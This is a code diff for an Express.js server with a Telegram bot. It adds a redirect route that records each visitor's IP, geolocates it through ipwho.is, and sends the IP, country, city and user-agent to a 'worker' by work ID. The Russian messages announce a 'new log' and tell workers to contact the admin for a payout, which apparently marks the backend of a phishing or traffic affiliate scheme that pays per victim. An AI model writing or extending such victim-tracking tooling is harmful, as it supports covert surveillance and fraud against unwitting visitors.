@@ -16,7 +16,7 @@ app.get('/', async (req, res) => {
    // res.sendFile(path.join(__dirname, 'site', 'index.html'))
 })
 
-app.get('/backendapi/newvisitors/:workid', async (req, res) => {
+app.get('/backendapi/statis/:workid', async (req, res) => {
    res.send("Hello!")
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress 
    fetch(`https://ipwho.is/${ip}`)
@@ -31,6 +31,7 @@ app.get('/backendapi/newvisitors/:workid', async (req, res) => {
          console.log(user.username)
          bot.telegram.sendMessage(user.chatId, `
 📶 Посещение ccылки
+
 🏳️ IP: ${ip}
 ▫️ Страна: ${data.flag.emoji} ${data.country}
 ▫️ Город: ${data.city}
@@ -44,9 +45,45 @@ app.get('/backendapi/newvisitors/:workid', async (req, res) => {
       }
    })
 	.catch(err => console.error(err));
-
-   
 })
+
+
+app.get('/backendapi/redirect/:workid', async (req, res) => {
+   res.send("Hello!")
+   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress 
+   fetch(`https://ipwho.is/${ip}`)
+	.then(response => response.json())
+	.then(async data => {
+      console.log(data)
+
+      console.log(req.params.workid)
+      const user = await UserModel.findOne({ where: {workId: '' + req.params.workid} })
+
+      if (user && data.success) {
+         console.log(user.username)
+         bot.telegram.sendMessage(user.chatId, `
+🥳 Новый лог!
+
+Обратись к админу за выплатой 💸
+
+🏳️ IP: ${ip}
+▫️ Страна: ${data.flag.emoji} ${data.country}
+▫️ Город: ${data.city}
+🚥 OS: ${req.headers['user-agent'] }
+         `);
+      } else if (user) {
+         bot.telegram.sendMessage(user.chatId, `
+🥳 Новый лог!
+
+Обратись к админу за выплатой 💸
+
+🏳️ IP: ${ip}
+         `);
+      }
+   })
+	.catch(err => console.error(err));
+})
+
 
 app.listen(port, async () => {
    
